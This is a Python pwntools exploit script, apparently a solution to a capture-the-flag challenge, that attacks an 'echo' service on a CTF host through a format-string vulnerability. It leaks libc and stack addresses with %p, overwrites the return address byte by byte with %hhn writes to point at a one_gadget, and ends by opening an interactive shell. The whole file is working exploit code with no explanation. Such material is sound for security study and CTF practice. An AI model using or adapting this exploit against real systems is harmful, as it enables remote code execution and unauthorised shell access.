from pwn import *
from time import sleep

r = remote("csie.ctf.tw", 10132)
# r = remote("127.0.0.1", 8888)
# r = process("./echo")


def my_send(data):
	r.send(data)
	sleep(1)

def my_recv():
	r.recv()
	sleep(1)

fd = 0x601010
# one_gadget_off = 0x4f2c5
one_gadget_off = 0x4f322
# one_gadget_off = 0x10a38c

my_send("%{}c%7$n\x00".format(fd))
my_send("%{}c%9$n\x00".format(1))

my_send("%10$p.\x00")
libc = int(r.recvuntil(".")[:-1], 16) - 0x21b97
one_gadget = libc + one_gadget_off

print(hex(one_gadget))

my_send("%5$p.\x00")
ret_addr = int(r.recvuntil(".")[:-1], 16) + 0x8
jump = ret_addr & 0xff
print(hex(ret_addr))

my_send("%{}c%5$hhn\x00".format(jump))
my_recv()
my_send("%{}c%7$hhn\x00".format(one_gadget & 0xff))
my_recv()
my_send("%{}c%5$hhn\x00".format(jump + 1))
my_recv()
my_send("%{}c%7$hhn\x00".format((one_gadget >> 8) & 0xff))
my_recv()
my_send("%{}c%5$hhn\x00".format(jump + 2))
my_recv()
my_send("%{}c%7$hhn\x00".format((one_gadget >> 16) & 0xff))
my_recv()
my_send("%{}c%5$hhn\x00".format(jump + 3))
my_recv()
my_send("%{}c%7$hhn\x00".format((one_gadget >> 24) & 0xff))
my_recv()
my_send("%{}c%5$hhn\x00".format(jump + 4))
my_recv()
my_send("%{}c%7$hhn\x00".format((one_gadget >> 32) & 0xff))
my_recv()
my_send("%{}c%5$hhn\x00".format(jump + 5))
my_recv()
my_send("%{}c%7$hhn\x00".format((one_gadget >> 40) & 0xff))
my_recv()

# raw_input('aaa')

jump = (ret_addr + 0x48) & 0xff
my_send("%{}c%5$hhn\x00".format(jump))
my_recv()
my_send("%7$n\x00")
my_send("%{}c%5$hhn\x00".format(jump+4))
my_recv()
my_send("%7$n\x00")

my_send("exit")

r.interactive()

